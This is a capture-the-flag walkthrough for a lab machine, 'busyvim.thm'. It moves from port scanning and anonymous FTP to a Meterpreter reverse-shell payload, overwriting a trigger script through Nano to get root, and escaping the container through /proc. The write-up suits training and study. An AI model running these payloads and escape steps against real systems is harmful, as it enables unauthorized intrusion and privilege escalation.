```
Reconnaissance
1. Port Scanning

A full port scan reveals several interesting services.
Bash

nmap -Pn -p- busyvim.thm

Port	Service	Description
22	SSH	Requires a private key (currently inaccessible).
80	HTTP	WebSocket / Web interface.
8075	FTP	BusyBox ftpd (Allows anonymous login).
8085	Telnet	Drops the user into a Vim editor.
8095	Telnet	Drops the user into a Nano editor.
8065	Telnet	Trigger Port: Executes /usr/frosty/sh upon connection.
2. FTP Enumeration (Flag 1)

Anonymous login is enabled. Connect to grab the first flag.
Bash

ftp busyvim.thm 8075
# Login as anonymous
get flag-1-of-4.txt
cat flag-1-of-4.txt

II. Initial Access & Flag 2
1. Vim Environment (Flag 2)

Connecting to the Vim instance on port 8085 allows us to query environment variables.
Bash

telnet busyvim.thm 8085

Inside Vim, type the following to see the second flag:
Vim Script

:echo $FLAG2

2. Identifying the Restriction

If you try to spawn a shell with :shell or :!/bin/bash, it fails with: Cannot execute shell /tmp/sh This indicates the container is missing a working shell or the path is pointed to a non-existent binary.
III. Privilege Escalation & Reverse Shell

The goal is to overwrite /usr/frosty/sh with a malicious payload because port 8065 executes that specific file when someone connects to it.
1. Create the Payload

On your Kali machine, generate an ELF reverse shell:
Bash

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o payload.elf

2. Upload the Payload

Upload the binary to the target via FTP:
Bash

ftp busyvim.thm 8075
put payload.elf

3. Overwrite the Trigger Script

Connect to the Nano service (Port 8095) to move the binary to the trigger location.

    telnet busyvim.thm 8095

    Press Ctrl+R, type /tmp/ftp/payload.elf, and hit Enter.

    Press Ctrl+O, type /usr/frosty/sh, and hit Enter to overwrite.

    Press Ctrl+X to exit.

4. Catch the Shell

Start a listener in Metasploit:
Bash

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
run

In a new terminal, trigger the payload:
Bash

telnet busyvim.thm 8065

You should now have a Meterpreter session as root inside the container.
IV. Flag 3 (Container Root)

Inside your Meterpreter session:
Bash

cat /root/flag-3-of-4.txt

V. Docker Escape (Flag 4 & YetiKey)

The container is misconfigured, allowing us to see host processes through the /proc directory. We can access the host's filesystem by traversing the root symbolic link of a host process.
1. Finding the Escape Path

Since standard shells might be unstable, use Meterpreter's ls to find a valid host process (usually PID 1 or 1266).
Bash

ls /proc/1/root/root/

2. Capturing the Final Flags

Once you see the files flag-4-of-4.txt and yetikey3.txt, read them directly:

Flag 4 (Host Root):
Bash

cat /proc/1/root/root/flag-4-of-4.txt

YetiKey 3 (Host Root):
Bash

cat /proc/1/root/root/yetikey3.txt
```